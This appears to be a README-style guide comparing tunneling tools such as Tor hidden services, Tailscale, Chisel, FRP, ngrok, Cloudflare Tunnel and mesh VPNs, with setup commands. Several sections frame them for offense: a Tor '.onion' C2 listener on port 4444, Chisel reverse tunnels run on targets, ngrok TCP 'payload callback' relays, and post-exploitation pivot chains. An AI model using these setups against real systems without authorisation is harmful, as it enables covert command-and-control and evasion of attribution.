> A practical, offensive-minded guide to modern tunneling techniques, tools, and tradeoffs.  
> Choose the right approach based on **threat model**, **control**, and **privacy needs**.

**Written by Aryan Giri**

---

## 🧠 Core Idea

Traditional port forwarding **exposes** systems:

```
Internet ──▶ Open Port ──▶ Service
```

Modern tunneling **reduces exposure**:

```
Outbound Connection ──▶ Encrypted Tunnel ──▶ Controlled Access
```

Key shift: from **network exposure** → to **access control & encryption**

---

## 🧅 Tor — Hidden Services (Anonymous Access)

### What this model does

Replaces your IP + port with a `.onion` address. Traffic routes through the Tor network — no IP exposure, no DNS leaks, no open inbound ports needed.

```
Client ──▶ Guard Relay ──▶ Middle Relay ──▶ Rendezvous Point ──▶ Hidden Service
```

### Example config

```bash
HiddenServiceDir /var/lib/tor/my_hidden_service/
HiddenServicePort 80 127.0.0.1:8080
```

### Quick setup

```bash
apt install tor

echo "HiddenServiceDir /var/lib/tor/c2/
HiddenServicePort 443 127.0.0.1:4444" >> /etc/tor/torrc

systemctl restart tor
cat /var/lib/tor/c2/hostname   # your .onion address
```

### Strengths

- True anonymity — server IP never revealed to client or any relay
- Bypasses NAT, CGNAT, and firewalls with zero router config
- Built-in end-to-end encryption via layered onion routing
- Free, no account, no DNS registration required
- Survives takedown attempts — no centralized infrastructure

### Tradeoffs

- High latency (~500ms–2s) — not suitable for real-time traffic
- Bandwidth limited by the relay network
- `.onion` v3 addresses are 56 characters — not memorable
- Blocked by some ISPs and corporate firewalls
- Requires Tor Browser on the client side

### When to use

- Anonymous C2 infrastructure with no attribution risk
- Whistleblowing or censorship-resistant services
- Research and anonymity-focused setups

---

## 🔒 Tailscale — WireGuard Mesh VPN

### What this model does

Creates a peer-to-peer encrypted WireGuard mesh between all your devices. Every node gets a stable `100.x.x.x` IP. Port forwarding becomes irrelevant — connect directly to the internal mesh IP from anywhere.

```
[Laptop 100.64.0.1] ◀──WireGuard──▶ [VPS 100.64.0.2] ◀──WireGuard──▶ [Phone 100.64.0.3]
                              ▲
                    Tailscale Control Plane
                    (key exchange only)
```

### Quick setup

```bash
# Install and connect
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up

# Expose a local service publicly (Funnel)
tailscale funnel 8080

# Act as exit node — route all traffic through this device
tailscale up --advertise-exit-node

# Subnet routing — expose 192.168.1.0/24 to tailnet
tailscale up --advertise-routes=192.168.1.0/24
```

### Strengths

- Zero open ports — P2P WireGuard punches through NAT automatically
- `100.x.x.x` stable IPs — devices always reachable regardless of location
- MagicDNS — use hostnames like `my-server` instead of IPs
- Subnet routing — expose entire internal networks with one exit node
- Tailscale Funnel — expose local ports publicly without a VPS
- ACL policies — fine-grained access control per device/user
- Free for personal use (up to 100 devices, 3 users)

### Tradeoffs

- Requires a Tailscale account (proprietary control plane)
- Traffic metadata visible to Tailscale's coordination server
- Not suitable for anonymous ops
- Funnel bandwidth limited on free tier

### When to use

- Remote access to personal or lab systems
- Internal tools, dashboards, and self-hosted services
- Secure team infrastructure without VPN complexity

---

## ⚙️ Self-Hosted Tunnels — Chisel / FRP / Bore

### What this model does

Uses a VPS or external server to relay traffic. You own the full infrastructure — no third-party trust required.

```
Client ──▶ VPS Relay (you own it) ──▶ Internal Service
```

### Example — Chisel (Red Team Favorite)

```bash
# On your VPS
chisel server -p 8000 --reverse

# On target / client
chisel client VPS_IP:8000 R:4444:localhost:22
```

### Example — FRP (Fast Reverse Proxy)

```ini
# frps.ini (server)
[common]
bind_port = 7000

# frpc.ini (client)
[common]
server_addr = VPS_IP
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
```

### Example — Bore

```bash
# Expose local port 8080 publicly
bore local 8080 --to bore.pub
```

### Strengths

- Full control over infrastructure — no third-party trust
- Works through strict firewalls and deep packet inspection
- Flexible routing — SSH, web, custom protocols
- Ligolo-ng variant creates a full TUN interface — no SOCKS proxy needed

### Tradeoffs

- Requires server management and maintenance
- Misconfiguration can silently expose services
- VPS costs money

### When to use

- Internal network pivoting post-exploitation
- Custom lab and range environments
- Controlled red team engagements

---

## ☁️ Managed Tunnels — Cloudflare / Ngrok

### What this model does

Uses a third-party service to expose local apps securely. No VPS required — the provider handles relay infrastructure.

### Cloudflare Tunnel

```bash
# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64

# Authenticate and create tunnel
cloudflared tunnel login
cloudflared tunnel create my-tunnel
cloudflared tunnel route dns my-tunnel subdomain.yourdomain.com

# Run
cloudflared tunnel run my-tunnel
```

### Ngrok

```bash
# Expose HTTP
ngrok http 8080

# Expose raw TCP (C2 relay)
ngrok tcp 4444

# Static domain (paid)
ngrok http --domain=your.ngrok.app 8080
```

### Strengths

- Zero server management
- Built-in access control, TLS, and DDoS protection (Cloudflare)
- Instant public URLs with traffic inspection UI (Ngrok)
- Works behind CGNAT with no router config

### Tradeoffs

- Centralized trust — traffic passes through provider infrastructure
- Ngrok free tier has no static IPs or custom domains
- Not suitable for ops requiring full infrastructure control

### When to use

- Quick webhook testing and local dev exposure
- Hosting internal tools with zero-trust access
- Rapid C2 relay setup during engagements (Ngrok TCP)

---

## 🕸️ Mesh VPN — ZeroTier / Nebula

### What this model does

Creates a software-defined private network between devices. No central relay — peers connect directly after initial coordination.

### ZeroTier

```bash
# Install
curl -s https://install.zerotier.com | sudo bash

# Join a network
zerotier-cli join <NETWORK_ID>
```

### Nebula (Slack's open-source mesh)

```bash
# Generate certs
./nebula-cert ca -name "My Org"
./nebula-cert sign -name "laptop" -ip "192.168.100.1/24"

# Run with config
./nebula -config /etc/nebula/config.yml
```

### Strengths

- No router configuration required
- Encrypted peer-to-peer — no central relay after handshake
- Works behind NAT and firewalls
- Nebula is fully self-hosted — no vendor dependency

### Tradeoffs

- Not anonymous — identity or certificates required
- ZeroTier uses coordination servers (self-hostable)
- Slightly higher setup complexity than Tailscale

### When to use

- Lab environments and internal tooling
- Teams needing a fully self-hosted mesh (Nebula)
- Remote access without opening firewall ports

---

## ⚡ Convenience Tools — Low Control

Tools like **Pinggy**, **LocalTunnel**, and **LocalXpose** get you a public URL in seconds.

```bash
# LocalTunnel
npx localtunnel --port 8080

# Pinggy
ssh -p 443 -R0:localhost:8080 a.pinggy.io
```

### Strengths

- Sub-60-second setup
- No account required for most
- Good for webhook debugging and demos

### Tradeoffs

- Shared infrastructure — limited privacy guarantees
- No persistent URLs on free tiers
- Zero control over logging or data handling

### When to use

- Temporary webhook testing (Stripe, GitHub, Twilio)
- Quick local demos
- Nothing involving sensitive data

---

## 📊 Full Comparison Table

| Tool | Anonymity | Latency | Open Ports? | Self-Hostable | Free | Best For |
|---|---|---|---|---|---|---|
| **Tor** | ⭐⭐⭐⭐⭐ | High | ❌ | ✅ | ✅ | Anonymous C2, censorship bypass |
| **Tailscale** | ⭐⭐ | Low (WireGuard) | ❌ | Partial | ✅ | Mesh access, lab infra |
| **Chisel** | ⭐⭐⭐ | Medium | ❌ | ✅ | ✅ | Pivoting, firewall bypass |
| **Ligolo-ng** | ⭐⭐⭐ | Low | ❌ | ✅ | ✅ | Post-exploit network pivot |
| **Cloudflare Tunnel** | ⭐⭐ | Low | ❌ | ❌ | ✅ | Production hosting |
| **Ngrok** | ⭐ | Low | ❌ | ❌ | ✅ | Quick dev/relay exposure |
| **ZeroTier** | ⭐⭐ | Low | ❌ | ✅ | ✅ | P2P mesh networking |
| **Nebula** | ⭐⭐⭐ | Low | ❌ | ✅ | ✅ | Full self-hosted mesh |
| **LocalTunnel** | ⭐ | Low | ❌ | ✅ | ✅ | Webhook testing only |

---

## ⚠️ Practical Security Notes

- Tunnels **bypass traditional firewall assumptions** — treat them as new attack surface
- Always bind services to `127.0.0.1` unless explicitly needed on `0.0.0.0`
- Monitor open connections: `ss -tulnp` / `netstat -an`
- Understand the logging behavior of every tool before use in sensitive ops
- Rotate `.onion` addresses and Ngrok URLs between engagements
- Never run tunnel clients as root unless required
- Use firewall rules to restrict which processes can reach tunnel endpoints

---

## 🎯 OpSec Combinations

### Anonymous C2 Infrastructure

```
Tor Hidden Service (.onion) ──▶ C2 Listener (localhost)
```

No IP exposed anywhere. Client beacons over Tor. Zero attribution.

### Layered Team Infrastructure

```
Tailscale Mesh (trusted internal) + Tor Funnel (public anonymous entry)
```

Internal team communicates over WireGuard mesh. Public-facing endpoints use Tor.

### Pivot Chain (Post-Exploitation)

```
Attacker ──▶ Chisel/Ligolo-ng ──▶ Compromised Host ──▶ Internal Network
```

Firewall sees only outbound traffic from compromised host to attacker VPS.

### Zero-Infrastructure Relay

```
Ngrok TCP ──▶ Local Listener ──▶ Payload Callback
```

Fast setup, no VPS needed. Rotate URLs per engagement.

---

## 🧪 Practice Lab

Build a simple lab to understand each layer:

```
Device A (attacker) ◀──▶ Device B (victim/server)
          │
          └──▶ VPS Relay (Chisel)
                    │
                    └──▶ Tor Hidden Service (.onion)
```

Test each layer:

```bash
# 1. Connectivity (Tailscale mesh)
ping 100.x.x.x

# 2. Tunnel latency
time curl http://VPS_IP:PORT

# 3. Anonymity check (Tor)
curl --socks5-hostname 127.0.0.1:9050 http://check.torproject.org

# 4. Traffic visibility
sudo wireshark -i any -k
```

What to observe: which hops are visible in Wireshark for each approach, latency differences between direct/tunneled/Tor traffic, and what gets logged where.

---

## 📈 Suggested Learning Path

```
1. Tailscale          →  Understand peer-to-peer connectivity
2. Chisel / FRP       →  Understand relay routing and firewall bypass
3. Tor Hidden Service →  Understand anonymity vs usability tradeoffs
4. Combine all three  →  Build layered, production-grade infrastructure
```

---

## 🧠 Final Insight

There is no universally **best** tool. Each approach solves a different problem:

```
Mesh VPN  →  Connectivity without exposed ports
Tunnels   →  Controlled exposure through firewalls
Tor       →  Anonymity with zero IP attribution
```

Effective setups come from **combining them thoughtfully** — not relying on a single solution. Map your threat model first, then choose your stack.

---

> 🚀 Build, test, break, and understand the tradeoffs.

---

*Made by Aryan Giri*
